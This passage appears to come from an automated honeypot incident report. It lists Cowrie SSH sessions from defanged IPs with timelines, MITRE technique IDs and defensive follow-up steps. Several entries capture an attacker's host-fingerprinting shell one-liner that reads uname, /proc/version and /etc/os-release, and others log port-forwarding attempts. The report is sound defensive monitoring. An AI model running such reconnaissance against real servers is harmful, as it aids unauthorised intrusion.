| `2026-07-11 12:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be744db685ed

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 12:28 |
| **Last Seen** | 2026-07-11 12:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:28:18` | `cowrie.session.connect` |
| `2026-07-11 12:28:18` | `cowrie.client.version` |
| `2026-07-11 12:28:18` | `cowrie.client.kex` |
| `2026-07-11 12:28:18` | `cowrie.login.success` |
| `2026-07-11 12:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c8c77d13162

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 12:28 |
| **Last Seen** | 2026-07-11 12:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:28:19` | `cowrie.session.connect` |
| `2026-07-11 12:28:19` | `cowrie.client.version` |
| `2026-07-11 12:28:19` | `cowrie.client.kex` |
| `2026-07-11 12:28:19` | `cowrie.login.success` |
| `2026-07-11 12:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53d0d772f5c9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 12:28 |
| **Last Seen** | 2026-07-11 12:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:28:22` | `cowrie.session.connect` |
| `2026-07-11 12:28:22` | `cowrie.client.version` |
| `2026-07-11 12:28:22` | `cowrie.client.kex` |
| `2026-07-11 12:28:22` | `cowrie.login.success` |
| `2026-07-11 12:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7174345fb107

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 12:28 |
| **Last Seen** | 2026-07-11 12:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:28:22` | `cowrie.session.connect` |
| `2026-07-11 12:28:22` | `cowrie.client.version` |
| `2026-07-11 12:28:22` | `cowrie.client.kex` |
| `2026-07-11 12:28:22` | `cowrie.login.success` |
| `2026-07-11 12:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c385c5a01b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:28 |
| **Last Seen** | 2026-07-11 12:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:28:26` | `cowrie.session.connect` |
| `2026-07-11 12:28:27` | `cowrie.client.version` |
| `2026-07-11 12:28:27` | `cowrie.client.kex` |
| `2026-07-11 12:28:28` | `cowrie.login.success` |
| `2026-07-11 12:28:29` | `cowrie.session.params` |
| `2026-07-11 12:28:29` | `cowrie.command.input` |
| `2026-07-11 12:28:29` | `cowrie.command.input` |
| `2026-07-11 12:28:29` | `cowrie.command.input` |
| `2026-07-11 12:28:29` | `cowrie.command.input` |
| `2026-07-11 12:28:29` | `cowrie.command.input` |
| `2026-07-11 12:28:29` | `cowrie.command.success` |
| `2026-07-11 12:28:29` | `cowrie.command.input` |
| `2026-07-11 12:28:29` | `cowrie.command.input` |
| `2026-07-11 12:28:29` | `cowrie.command.input` |
| `2026-07-11 12:28:29` | `cowrie.command.input` |
| `2026-07-11 12:28:30` | `cowrie.log.closed` |
| `2026-07-11 12:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dccb08d0b6e

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-07-11 12:28 |
| **Last Seen** | 2026-07-11 12:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:28:54` | `cowrie.session.connect` |
| `2026-07-11 12:28:55` | `cowrie.client.version` |
| `2026-07-11 12:28:55` | `cowrie.client.kex` |
| `2026-07-11 12:28:57` | `cowrie.login.success` |
| `2026-07-11 12:28:58` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e8902b38f8

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-07-11 12:29 |
| **Last Seen** | 2026-07-11 12:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:29:03` | `cowrie.session.connect` |
| `2026-07-11 12:29:03` | `cowrie.client.version` |
| `2026-07-11 12:29:03` | `cowrie.client.kex` |
| `2026-07-11 12:29:04` | `cowrie.login.success` |
| `2026-07-11 12:29:05` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60dcb7c4a087

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:30 |
| **Last Seen** | 2026-07-11 12:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:30:24` | `cowrie.session.connect` |
| `2026-07-11 12:30:24` | `cowrie.client.version` |
| `2026-07-11 12:30:25` | `cowrie.client.kex` |
| `2026-07-11 12:30:26` | `cowrie.login.success` |
| `2026-07-11 12:30:27` | `cowrie.session.params` |
| `2026-07-11 12:30:27` | `cowrie.command.input` |
| `2026-07-11 12:30:27` | `cowrie.command.input` |
| `2026-07-11 12:30:27` | `cowrie.command.input` |
| `2026-07-11 12:30:27` | `cowrie.command.input` |
| `2026-07-11 12:30:27` | `cowrie.command.input` |
| `2026-07-11 12:30:27` | `cowrie.command.success` |
| `2026-07-11 12:30:27` | `cowrie.command.input` |
| `2026-07-11 12:30:27` | `cowrie.command.input` |
| `2026-07-11 12:30:27` | `cowrie.command.input` |
| `2026-07-11 12:30:27` | `cowrie.command.input` |
| `2026-07-11 12:30:28` | `cowrie.log.closed` |
| `2026-07-11 12:30:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba70a1ff9a25

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:32 |
| **Last Seen** | 2026-07-11 12:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:32:17` | `cowrie.session.connect` |
| `2026-07-11 12:32:17` | `cowrie.client.version` |
| `2026-07-11 12:32:17` | `cowrie.client.kex` |
| `2026-07-11 12:32:18` | `cowrie.login.success` |
| `2026-07-11 12:32:20` | `cowrie.session.params` |
| `2026-07-11 12:32:20` | `cowrie.command.input` |
| `2026-07-11 12:32:20` | `cowrie.command.input` |
| `2026-07-11 12:32:20` | `cowrie.command.input` |
| `2026-07-11 12:32:20` | `cowrie.command.input` |
| `2026-07-11 12:32:20` | `cowrie.command.input` |
| `2026-07-11 12:32:20` | `cowrie.command.success` |
| `2026-07-11 12:32:20` | `cowrie.command.input` |
| `2026-07-11 12:32:20` | `cowrie.command.input` |
| `2026-07-11 12:32:20` | `cowrie.command.input` |
| `2026-07-11 12:32:20` | `cowrie.command.input` |
| `2026-07-11 12:32:20` | `cowrie.log.closed` |
| `2026-07-11 12:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa1a827009b5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:34 |
| **Last Seen** | 2026-07-11 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:34:14` | `cowrie.session.connect` |
| `2026-07-11 12:34:14` | `cowrie.client.version` |
| `2026-07-11 12:34:14` | `cowrie.client.kex` |
| `2026-07-11 12:34:15` | `cowrie.login.success` |
| `2026-07-11 12:34:16` | `cowrie.session.params` |
| `2026-07-11 12:34:16` | `cowrie.command.input` |
| `2026-07-11 12:34:16` | `cowrie.command.input` |
| `2026-07-11 12:34:16` | `cowrie.command.input` |
| `2026-07-11 12:34:16` | `cowrie.command.input` |
| `2026-07-11 12:34:16` | `cowrie.command.input` |
| `2026-07-11 12:34:16` | `cowrie.command.success` |
| `2026-07-11 12:34:16` | `cowrie.command.input` |
| `2026-07-11 12:34:16` | `cowrie.command.input` |
| `2026-07-11 12:34:16` | `cowrie.command.input` |
| `2026-07-11 12:34:16` | `cowrie.command.input` |
| `2026-07-11 12:34:16` | `cowrie.log.closed` |
| `2026-07-11 12:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88f3007bed9e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:36 |
| **Last Seen** | 2026-07-11 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:36:18` | `cowrie.session.connect` |
| `2026-07-11 12:36:18` | `cowrie.client.version` |
| `2026-07-11 12:36:18` | `cowrie.client.kex` |
| `2026-07-11 12:36:19` | `cowrie.login.success` |
| `2026-07-11 12:36:20` | `cowrie.session.params` |
| `2026-07-11 12:36:20` | `cowrie.command.input` |
| `2026-07-11 12:36:20` | `cowrie.command.input` |
| `2026-07-11 12:36:20` | `cowrie.command.input` |
| `2026-07-11 12:36:20` | `cowrie.command.input` |
| `2026-07-11 12:36:20` | `cowrie.command.input` |
| `2026-07-11 12:36:20` | `cowrie.command.success` |
| `2026-07-11 12:36:20` | `cowrie.command.input` |
| `2026-07-11 12:36:20` | `cowrie.command.input` |
| `2026-07-11 12:36:20` | `cowrie.command.input` |
| `2026-07-11 12:36:20` | `cowrie.command.input` |
| `2026-07-11 12:36:21` | `cowrie.log.closed` |
| `2026-07-11 12:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78c307d9a563

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-07-11 12:36 |
| **Last Seen** | 2026-07-11 12:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:36:37` | `cowrie.session.connect` |
| `2026-07-11 12:36:39` | `cowrie.client.version` |
| `2026-07-11 12:36:39` | `cowrie.client.kex` |
| `2026-07-11 12:36:41` | `cowrie.login.success` |
| `2026-07-11 12:36:41` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c6a2b6bf074

| Field | Detail |
|---|---|
| **Source IP** | `136.185.6[.]181` |
| **First Seen** | 2026-07-11 12:36 |
| **Last Seen** | 2026-07-11 12:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:36:47` | `cowrie.session.connect` |
| `2026-07-11 12:36:48` | `cowrie.client.version` |
| `2026-07-11 12:36:48` | `cowrie.client.kex` |
| `2026-07-11 12:36:49` | `cowrie.login.success` |
| `2026-07-11 12:36:50` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.185.6[.]181` to AbuseIPDB if not already reported
- [ ] Block `136.185.6[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f5b0148c9d5

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 12:37 |
| **Last Seen** | 2026-07-11 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:37:33` | `cowrie.session.connect` |
| `2026-07-11 12:37:33` | `cowrie.client.version` |
| `2026-07-11 12:37:33` | `cowrie.client.kex` |
| `2026-07-11 12:37:34` | `cowrie.login.success` |
| `2026-07-11 12:37:35` | `cowrie.session.params` |
| `2026-07-11 12:37:35` | `cowrie.command.input` |
| `2026-07-11 12:37:35` | `cowrie.log.closed` |
| `2026-07-11 12:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5cc91f1d802

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:40 |
| **Last Seen** | 2026-07-11 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:40:05` | `cowrie.session.connect` |
| `2026-07-11 12:40:05` | `cowrie.client.version` |
| `2026-07-11 12:40:05` | `cowrie.client.kex` |
| `2026-07-11 12:40:06` | `cowrie.login.success` |
| `2026-07-11 12:40:08` | `cowrie.session.params` |
| `2026-07-11 12:40:08` | `cowrie.command.input` |
| `2026-07-11 12:40:08` | `cowrie.command.input` |
| `2026-07-11 12:40:08` | `cowrie.command.input` |
| `2026-07-11 12:40:08` | `cowrie.command.input` |
| `2026-07-11 12:40:08` | `cowrie.command.input` |
| `2026-07-11 12:40:08` | `cowrie.command.success` |
| `2026-07-11 12:40:08` | `cowrie.command.input` |
| `2026-07-11 12:40:08` | `cowrie.command.input` |
| `2026-07-11 12:40:08` | `cowrie.command.input` |
| `2026-07-11 12:40:08` | `cowrie.command.input` |
| `2026-07-11 12:40:08` | `cowrie.log.closed` |
| `2026-07-11 12:40:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-161272d19b43

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:41 |
| **Last Seen** | 2026-07-11 12:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:41:54` | `cowrie.session.connect` |
| `2026-07-11 12:41:55` | `cowrie.client.version` |
| `2026-07-11 12:41:55` | `cowrie.client.kex` |
| `2026-07-11 12:41:56` | `cowrie.login.success` |
| `2026-07-11 12:41:58` | `cowrie.session.params` |
| `2026-07-11 12:41:58` | `cowrie.command.input` |
| `2026-07-11 12:41:58` | `cowrie.command.input` |
| `2026-07-11 12:41:58` | `cowrie.command.input` |
| `2026-07-11 12:41:58` | `cowrie.command.input` |
| `2026-07-11 12:41:58` | `cowrie.command.input` |
| `2026-07-11 12:41:58` | `cowrie.command.success` |
| `2026-07-11 12:41:58` | `cowrie.command.input` |
| `2026-07-11 12:41:58` | `cowrie.command.input` |
| `2026-07-11 12:41:58` | `cowrie.command.input` |
| `2026-07-11 12:41:58` | `cowrie.command.input` |
| `2026-07-11 12:41:58` | `cowrie.log.closed` |
| `2026-07-11 12:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68cf6e631418

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:43 |
| **Last Seen** | 2026-07-11 12:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:43:40` | `cowrie.session.connect` |
| `2026-07-11 12:43:40` | `cowrie.client.version` |
| `2026-07-11 12:43:40` | `cowrie.client.kex` |
| `2026-07-11 12:43:42` | `cowrie.login.success` |
| `2026-07-11 12:43:43` | `cowrie.session.params` |
| `2026-07-11 12:43:43` | `cowrie.command.input` |
| `2026-07-11 12:43:43` | `cowrie.command.input` |
| `2026-07-11 12:43:43` | `cowrie.command.input` |
| `2026-07-11 12:43:43` | `cowrie.command.input` |
| `2026-07-11 12:43:43` | `cowrie.command.input` |
| `2026-07-11 12:43:43` | `cowrie.command.success` |
| `2026-07-11 12:43:43` | `cowrie.command.input` |
| `2026-07-11 12:43:43` | `cowrie.command.input` |
| `2026-07-11 12:43:43` | `cowrie.command.input` |
| `2026-07-11 12:43:43` | `cowrie.command.input` |
| `2026-07-11 12:43:43` | `cowrie.log.closed` |
| `2026-07-11 12:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8cad0788d6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:45 |
| **Last Seen** | 2026-07-11 12:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
